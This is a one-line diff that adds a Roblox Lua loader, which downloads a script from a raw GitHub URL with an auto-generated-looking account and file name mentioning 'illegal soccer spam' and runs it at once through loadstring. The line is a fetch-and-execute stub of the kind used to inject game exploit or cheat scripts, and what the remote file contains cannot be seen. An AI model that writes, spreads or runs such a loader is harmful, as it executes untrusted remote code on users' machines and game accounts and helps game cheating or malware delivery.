@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/update-illegal-soccer-spam7-0plnx799iitclb.lua"))()
